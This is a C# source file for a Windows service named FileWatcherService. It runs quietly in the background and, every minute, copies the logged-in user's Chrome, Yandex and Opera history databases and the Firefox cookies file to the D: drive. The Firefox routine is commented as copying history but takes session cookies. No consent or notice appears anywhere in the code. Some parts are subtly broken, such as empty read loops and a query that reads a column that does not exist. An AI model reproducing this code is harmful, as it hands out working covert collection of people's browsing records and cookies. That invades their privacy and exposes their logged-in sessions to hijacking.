using System;
using System.ServiceProcess;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Data.SQLite;
using System.Data.Common;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Security.Principal;
using WindowsMonitorService;
using System.Collections.ObjectModel;
using System.Collections;
using System.Management;

namespace FileWatcherService
{
    public partial class Service1 : ServiceBase
    {
        Logger logger;
        string UserName;
        public Service1()
        {
            InitializeComponent();


            UserName = GetUserName();
            this.CanStop = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;

            this.CanHandleSessionChangeEvent = true;
        }

        protected override void OnSessionChange(SessionChangeDescription obj)
        {
           
               logger.UserName = GetUserName();
            
        }

        private string GetUserName()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem");
            ManagementObjectCollection collection = searcher.Get();
            string s = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split('\\')[1].Split('-')[0];

            return s ;
        }



        protected override void OnStart(string[] args)
        {
            logger = new Logger(GetUserName());
            Thread loggerThread = new Thread(new ThreadStart(logger.Start));
            loggerThread.Start();
        }



        protected override void OnStop()
        {
            logger.Stop();
            Thread.Sleep(4000);
        }
    }

    class Logger
    {

        public string UserName { get; set; }
        object obj = new object();
        bool enabled = true;
  
        public Logger(string name)
        {
            UserName = name;
        }

        /// <summary>
        /// Копирование файла истории Opera
        /// </summary>
        private void readHistoryOpera()
        {
            try
            {
                string opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        opera = Path.GetFullPath(f);

                    }
                }

                using (FileStream ms = new FileStream(opera, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyOpera.db", buffer);
                    //readHistory();
                }
                opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\t" );
            }
        }




        /// <summary>
        /// Копирование файла истории Firefox
        /// </summary>
        private void readHistoryFirefox()
        {
            try
            {
                string firefox = String.Empty;

                foreach (var item in Directory.GetFiles($@"{Directory.GetDirectories($@"C:\Users\{UserName}\AppData\Roaming\Mozilla\Firefox\Profiles")[0]}\"))
                {

                    if (Path.GetFileName(item.ToLower()).ToString().Equals("cookies.sqlite"))
                    {
                        firefox = Path.GetFullPath(item);

                    }
                }

                using (FileStream ms = new FileStream(firefox, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyFirefox.sqlite", buffer);
                    //readHistory();
                }

            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message, "");
            }
        }




        /// <summary>
        /// Копирование файла истории Yandex
        /// </summary>
        private void readHistoryYandex()
        {
            try
            {
                string yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";

                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        yandex = Path.GetFullPath(f);

                    }
                }

                using (FileStream ms = new FileStream(yandex, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyYandex.db", buffer);
                    //readHistory();
                }
                yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";
                
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\t" );
            }
        }




        /// <summary>
        /// Копирование файла истории Google
        /// </summary>
        private void readHistoryGoogle()
        {
            try
            {
                string google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";

                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        google = Path.GetFullPath(f);

                    }
                }
                File.AppendAllText("bla.txt", UserName);
                using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyGoogle.db", buffer);
                    //readHistory();
                }
                google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\t");
            }
        }

        public void Start()
        {
        
            while (enabled)
            {
                Thread.Sleep(60000);
                readHistoryGoogle();
                readHistoryYandex();
                readHistoryFirefox();
                readHistoryOpera();
            }
        }
        const string databaseName = @"history.db";


        static async System.Threading.Tasks.Task<string> readHistory()
        {
            SQLiteConnection connection = null;
            try
            {
                connection = new SQLiteConnection(string.Format($"Data Source={databaseName};"));
                await connection.OpenAsync();
                StringBuilder stringBuilder = new StringBuilder();

                DbDataReader r = await new SQLiteCommand($"SELECT url FROM urls ", connection).ExecuteReaderAsync();
                if (r.HasRows)
                {
                    while (await r.ReadAsync())
                    {
                        stringBuilder.Append(r.GetValue(1));
                    }
                }

                return stringBuilder.ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                if (connection != null && connection.State == System.Data.ConnectionState.Closed) connection.Close();
            }
            return String.Empty;
        }

        public void Stop()
        {
       
            enabled = false;
        }


        private void RecordEntry(string fileEvent, string filePath)
        {
            lock (obj)
            {
                using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                {
                    writer.WriteLine(String.Format("{0} файл {1} был {2}",
                        DateTime.Now.ToString("dd/MM/yyyy hh:mm:ss"), filePath, fileEvent));
                    writer.Flush();
                }
            }
        }
    }
}